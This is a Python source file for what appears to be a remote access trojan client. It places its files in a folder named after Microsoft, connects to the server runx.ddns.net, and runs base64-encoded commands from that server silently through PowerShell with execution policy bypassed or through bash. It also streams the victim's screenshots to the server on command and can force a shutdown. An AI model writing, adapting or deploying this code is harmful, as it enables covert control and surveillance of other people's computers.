import os
import sys
import time
import io
import re
import base64
import threading
import subprocess
import shutil
from typing import Optional
from PIL import ImageGrab, Image
import socketio

IS_WINDOWS = sys.platform == "win32"

# ── Single Instance Enforcement ──

if IS_WINDOWS:
    import ctypes
    kernel32 = ctypes.windll.kernel32
    mutex = kernel32.CreateMutexW(None, False, "run_py_mutex")
    if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
        sys.exit(0)
else:
    import socket
    try:
        # Abstract namespace domain socket (Linux specific, auto-cleaned on process exit)
        _lock_socket = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        _lock_socket.bind("\0run_py_mutex")
    except (socket.error, OSError):
        sys.exit(0)

# ── Server Configuration & Client ID ──

VPS_URL = os.getenv("VPS_URL", "http://runx.ddns.net")

try:
    import client_config

    CLIENT_KEY = getattr(client_config, "CLIENT_KEY", "")
    CLIENT_VERSION = getattr(client_config, "CLIENT_VERSION", "dev")
except ImportError:
    CLIENT_KEY = ""
    CLIENT_VERSION = "dev"

if IS_WINDOWS:
    app_data = os.getenv("APPDATA") or os.path.expanduser("~\\AppData\\Roaming")
    data_dir = os.path.join(app_data, "Microsoft", "run")
    ID_PATH = os.path.join(data_dir, "run.txt")
    DAT_PATH = os.path.join(data_dir, "run.dat")
    raw_user = os.getenv("USERNAME", "user")
    os_suffix = "W"
else:
    xdg_data = os.getenv("XDG_DATA_HOME") or os.path.expanduser("~/.local/share")
    data_dir = os.path.join(xdg_data, "run")
    ID_PATH = os.path.join(data_dir, "run.txt")
    DAT_PATH = os.path.join(data_dir, "run.dat")
    raw_user = os.getenv("USER") or os.getenv("LOGNAME")
    if not raw_user:
        try:
            import getpass
            raw_user = getpass.getuser()
        except Exception:
            raw_user = "user"
    os_suffix = "L"

    # Ensure display environment variables are present for terminal launchers & screen grabbers
    if "DISPLAY" not in os.environ and os.path.exists("/tmp/.X11-unix"):
        for d in [":0", ":1"]:
            if os.path.exists(f"/tmp/.X11-unix/X{d[1:]}"):
                os.environ["DISPLAY"] = d
                break
    if "WAYLAND_DISPLAY" not in os.environ:
        runtime_dir = os.environ.get("XDG_RUNTIME_DIR") or f"/run/user/{os.getuid()}"
        for w in ["wayland-0", "wayland-1"]:
            if os.path.exists(os.path.join(runtime_dir, w)):
                os.environ["WAYLAND_DISPLAY"] = w
                break

if os.path.exists(DAT_PATH):
    try:
        with open(DAT_PATH, "r", encoding="utf-8") as f:
            v_raw = f.read().strip()
            if v_raw:
                CLIENT_VERSION = v_raw[:7]
    except Exception:
        pass

os.makedirs(os.path.dirname(ID_PATH), exist_ok=True)
if os.path.exists(ID_PATH):
    with open(ID_PATH, "r", encoding="utf-8") as f:
        raw = f.read().strip()
    unique_id = raw[:8] if len(raw) >= 8 else raw
else:
    import uuid

    unique_id = str(uuid.uuid4())[:8]
    with open(ID_PATH, "w", encoding="utf-8") as f:
        f.write(unique_id)

unique_user = f"{raw_user}-{unique_id}-{os_suffix}"

# ── Pre-compiled Regular Expressions ──

RE_SPEAK = re.compile(r"Speak\((.+?)\)")
RE_POPUP = re.compile(r"Popup\((.+?)\)")
RE_PS_CMD = re.compile(
    r"^\s*(powershell|pwsh)|(Read-Host|Write-Host|Get-|Set-|New-|Start-|Stop-|Invoke-|\$env:)",
    re.IGNORECASE,
)

# ── Cached Linux Environment Helpers ──

TERMINAL_EMULATORS = [
    "x-terminal-emulator",
    "gnome-terminal",
    "ptyxis",
    "kgx",
    "konsole",
    "xfce4-terminal",
    "alacritty",
    "kitty",
    "foot",
    "tilix",
    "terminator",
    "qterminal",
    "xterm",
]

_detected_terminal: Optional[str] = None
_terminal_detection_done: bool = False


def get_default_terminal() -> Optional[str]:
    """Detect and cache available Linux terminal emulator."""
    global _detected_terminal, _terminal_detection_done
    if not _terminal_detection_done:
        for t in TERMINAL_EMULATORS:
            if shutil.which(t):
                _detected_terminal = t
                break
        _terminal_detection_done = True
    return _detected_terminal


# ── SocketIO Client Initialization ──

sio = socketio.Client(reconnection=True, reconnection_delay=2)

capture_active = False
capture_thread = None


def grab_screen() -> Optional[Image.Image]:
    """Capture desktop screenshot across Windows and Linux (Wayland / X11)."""
    # 1. Native Pillow ImageGrab
    try:
        img = ImageGrab.grab()
        if img:
            return img
    except Exception:
        pass

    # 2. Linux Wayland / X11 fallbacks
    if not IS_WINDOWS:
        if os.getenv("WAYLAND_DISPLAY") and shutil.which("grim"):
            try:
                proc = subprocess.run(
                    ["grim", "-t", "jpeg", "-"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    timeout=3,
                )
                if proc.returncode == 0 and proc.stdout:
                    return Image.open(io.BytesIO(proc.stdout))
            except Exception:
                pass

        for bin_name, cmd in [
            ("scrot", ["scrot", "-z", "-o", "/dev/stdout"]),
            ("maim", ["maim", "-f", "jpeg"]),
            ("import", ["import", "-window", "root", "jpeg:-"]),
        ]:
            if shutil.which(bin_name):
                try:
                    proc = subprocess.run(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.DEVNULL,
                        timeout=3,
                    )
                    if proc.returncode == 0 and proc.stdout:
                        return Image.open(io.BytesIO(proc.stdout))
                except Exception:
                    pass

        # GNOME Wayland / X11 fallback
        if shutil.which("gnome-screenshot"):
            tmp_path = "/tmp/_run_screen.png"
            try:
                proc = subprocess.run(
                    ["gnome-screenshot", "-f", tmp_path],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=3,
                )
                if proc.returncode == 0 and os.path.exists(tmp_path):
                    with open(tmp_path, "rb") as f:
                        data = f.read()
                    try:
                        os.remove(tmp_path)
                    except Exception:
                        pass
                    return Image.open(io.BytesIO(data))
            except Exception:
                pass

    return None


def capture_loop():
    """Continuous screen frame capture stream."""
    global capture_active

    while capture_active:
        try:
            timestamp = (
                time.strftime("%Y%m%d%H%M%S") + f"{int(time.time() * 1000) % 1000:03d}"
            )
            filename = f"{timestamp}.jpg"

            img = grab_screen()
            if img is None:
                time.sleep(1)
                continue

            w, h = img.size
            img_resized = img.resize(
                (w // 2, h // 2), Image.Resampling.LANCZOS
            ).convert("L")

            buf = io.BytesIO()
            img_resized.save(buf, format="JPEG", quality=80)
            img_bytes = buf.getvalue()
            b64_img = base64.b64encode(img_bytes).decode("utf-8")

            if sio.connected:
                sio.emit(
                    "upload_frame",
                    {"username": unique_user, "filename": filename, "image": b64_img},
                )
        except Exception:
            pass
        time.sleep(1)


@sio.event
def connect():
    print(f"Connected to WebSocket server as {unique_user} (version: {CLIENT_VERSION})")
    sio.emit(
        "register",
        {
            "username": unique_user,
            "auth_token": CLIENT_KEY,
            "version": CLIENT_VERSION,
        },
    )


@sio.event
def disconnect():
    print("Disconnected from WebSocket server")


@sio.on("exec_command")
def on_exec_command(data):
    cmd_raw = data.get("cmd", "")
    visible = data.get("visible", 0)

    if not cmd_raw:
        return

    try:
        decoded_cmd = base64.b64decode(cmd_raw).decode("utf-8")
    except Exception:
        decoded_cmd = cmd_raw

    print(f"Executing command: {decoded_cmd}")

    if "panic" in decoded_cmd.lower():
        sys.exit(0)
    elif "altf4" in decoded_cmd.lower():
        if IS_WINDOWS:
            subprocess.Popen(
                ["shutdown", "/s", "/t", "0"], creationflags=subprocess.CREATE_NO_WINDOW
            )
        else:
            subprocess.Popen(["systemctl", "poweroff"])
        return

    cmd_str = decoded_cmd.strip()

    if IS_WINDOWS:
        creation_flags = (
            subprocess.CREATE_NEW_CONSOLE if visible else subprocess.CREATE_NO_WINDOW
        )
        if cmd_str.lower().startswith("powershell"):
            subprocess.Popen(cmd_str, shell=True, creationflags=creation_flags)
        else:
            subprocess.Popen(
                [
                    "powershell.exe",
                    "-NoProfile",
                    "-ExecutionPolicy",
                    "Bypass",
                    "-Command",
                    cmd_str,
                ],
                creationflags=creation_flags,
            )
        return

    # POSIX / Arch Linux execution
    if "SAPI.SpVoice" in cmd_str:
        m = RE_SPEAK.search(cmd_str)
        text = m.group(1).strip("'\"") if m else "Notification"
        subprocess.Popen(
            f'spd-say "{text}" 2>/dev/null || espeak "{text}" 2>/dev/null',
            shell=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        return

    if "WScript.Shell" in cmd_str and "Popup" in cmd_str:
        m = RE_POPUP.search(cmd_str)
        text = m.group(1).strip("'\"") if m else "Message"
        subprocess.Popen(
            f'notify-send "Run Alert" "{text}" 2>/dev/null || zenity --info --text="{text}" 2>/dev/null',
            shell=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        return

    pwsh_bin = shutil.which("pwsh") or shutil.which("powershell")
    use_pwsh = bool(pwsh_bin and RE_PS_CMD.search(cmd_str))

    if visible:
        term = get_default_terminal()
        if term:
            if term in ["gnome-terminal", "xfce4-terminal", "ptyxis", "tilix"]:
                term_args = (
                    [term, "--", pwsh_bin, "-NoExit", "-Command", cmd_str]
                    if use_pwsh
                    else [term, "--", "bash", "-c", f"{cmd_str}; exec bash"]
                )
            else:
                term_args = (
                    [term, "-e", pwsh_bin, "-NoExit", "-Command", cmd_str]
                    if use_pwsh
                    else [term, "-e", "bash", "-c", f"{cmd_str}; exec bash"]
                )
            subprocess.Popen(term_args, start_new_session=True)
        else:
            cmd_args = (
                [pwsh_bin, "-NoProfile", "-Command", cmd_str]
                if use_pwsh
                else ["bash", "-c", cmd_str]
            )
            subprocess.Popen(cmd_args, stdin=subprocess.DEVNULL, start_new_session=True)
    else:
        if use_pwsh:
            subprocess.Popen(
                [pwsh_bin, "-NoProfile", "-NonInteractive", "-Command", cmd_str],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True,
            )
        else:
            subprocess.Popen(
                ["bash", "-c", cmd_str],
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True,
            )


@sio.on("set_capture")
def on_set_capture(data):
    global capture_active, capture_thread
    should_capture = bool(data.get("capture", False))

    if should_capture and not capture_active:
        capture_active = True
        capture_thread = threading.Thread(target=capture_loop, daemon=True)
        capture_thread.start()
    elif not should_capture and capture_active:
        capture_active = False


def heartbeat_loop():
    while True:
        if sio.connected:
            try:
                sio.emit(
                    "heartbeat",
                    {
                        "username": unique_user,
                        "version": CLIENT_VERSION,
                    },
                )
            except Exception:
                pass
        time.sleep(5)


def main():
    hb_thread = threading.Thread(target=heartbeat_loop, daemon=True)
    hb_thread.start()

    while True:
        try:
            if not sio.connected:
                sio.connect(
                    VPS_URL,
                    wait_timeout=10,
                    transports=["websocket", "polling"],
                    auth={"token": CLIENT_KEY},
                )
                sio.wait()
        except Exception:
            pass
        time.sleep(5)


if __name__ == "__main__":
    main()
